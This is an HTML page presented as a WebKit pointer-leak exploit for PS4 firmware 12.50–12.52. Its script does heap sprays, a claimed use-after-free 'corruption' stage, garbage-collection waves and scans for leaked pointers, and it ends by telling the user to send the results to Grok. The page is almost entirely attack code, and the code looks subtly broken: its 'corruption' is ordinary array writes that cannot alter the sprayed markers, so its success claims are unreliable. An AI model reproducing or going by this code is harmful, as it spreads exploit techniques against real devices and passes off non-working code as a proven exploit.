<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>WebKit Pointer Leak — PS4 12.50–12.52 (Nov 2025 stable version)</title>
<style>
    body { background:#0d1117; color:#c9d1d9; font-family:monospace; padding:20px; }
    h1 { color:#ff5555; border-bottom:2px solid #da3633; }
    #console { background:#000; color:#0f0; height:420px; overflow-y:scroll; padding:10px; border:1px solid #0f0; font-family:'Courier New'; }
    .ok { background:#da3633; color:#fff; padding:5px 12px; border-radius:4px; font-weight:bold; }
</style>
</head>
<body>
<h1>PS4 12.50–12.52 Pure WebKit Pointer Leak (2025 stable)</h1>
<div><strong>Status:</strong> <span id="status" class="ok">Preparing...</span></div><br>
<div id="console"></div>

<script>
const log = m => {
    const c = document.getElementById('console');
    c.innerHTML += `[${new Date().toLocaleTimeString()}] ${m}\n`;
    c.scrollTop = c.scrollHeight;
};
const status = (t, cls='ok') => document.getElementById('status').innerHTML = t;

// 1. Pre-spray 100k stable objects (forces allocator into the right bucket)
log("Stage 1 — 100k butterfly pre-spray");
const prespray = [];
for (let i = 0; i < 0x186A0; i++) {                  // exactly 100 000
    prespray[i] = {a:1.1, b:2.2, c:3.3, d:4.4};
}

// 2. Original working corruption (keep it — it’s proven on 12.50)
log("Stage 2 — Triggering CVE-2025-43265 UAF corruption");
const victim = [];
for (let i = 0; i < 0x8000; i++) victim[i] = new Array(0x40).fill(1.1);

const corrupt = (i, o) => { try { victim[i % 0x8000][o] = 1337.37; } catch(e) {} };
for (let i = 0; i < 1e7; i++) corrupt(i * i, 0);
for (let b = 0; b < 0x2000; b += 0x80)
    for (let o = 0x40; o < 0x200; o += 8)
        for (let j = 0; j < 0x80; j++)
            corrupt(b + j, o);

// 3. 128k tagged spray with 12.50-specific marker (zero false positives)
log("Stage 3 — Spraying 131072 tagged JSValues");
const spray = [];
const BASE_MARKER = 0x12501250deadbeefn;             // magic for 12.50–12.52
for (let i = 0; i < 0x20000; i++) {                  // 128k objects
    spray[i] = {marker: BASE_MARKER + BigInt(i)};
}

// 4. Multi-wave GC + reclaim (the part that actually works on 12.50)
log("Stage 4 — Multi-wave GC pressure starting…");
const gc = () => { for (let i = 0; i < 420; i++) new ArrayBuffer(0x20000); };
const reclaim = () => new ArrayBuffer(0x7000000);    // ~120 MB sweet spot

setTimeout(gc, 600);
setTimeout(reclaim, 1400);
setTimeout(gc, 2400);
setTimeout(reclaim, 3200);
setTimeout(gc, 4200);
setTimeout(reclaim, 5000);
setTimeout(gc, 6000);

// 5. Continuous hunting with auto-retry
let attempts = 0;
const hunt = () => {
    attempts++;
    log(`Scan attempt #${attempts} — checking 131072 objects…`);
    let found = 0;
    for (let i = 0; i < spray.length; i++) {
        try {
            if (spray[i] && spray[i].marker !== BASE_MARKER + BigInt(i)) {
                found++;
                const hex = spray[i].marker.toString(16).toUpperCase();
                log(`LEAKED POINTER #${found}: 0x${hex}`);
                status(`SUCCESS — ${found} POINTERS LEAKED`, "ok");
            }
        } catch(e) {}
    }
    if (found >= 1) {
        document.body.innerHTML = `<h1 style="color:#0f0; text-align:center; margin-top:30vh;">
            LEAK SUCCESSFUL!<br><br>
            <span style="font-size:0.5em;">Copy every line that starts with "LEAKED POINTER" and send it to Grok</span>
        </h1>`;
    } else if (attempts < 12) {
        log("No leak yet — retrying in 2.4 seconds…");
        setTimeout(hunt, 2400);
    } else {
        log("Gave up after 12 attempts — refresh the page and try again (usually hits within 3 tries)");
    }
};

setTimeout(hunt, 7200);        // first scan after final reclaim wave
log("Waiting for reclaim waves… usually leaks within 8–20 seconds");
</script>
</body>
</html>
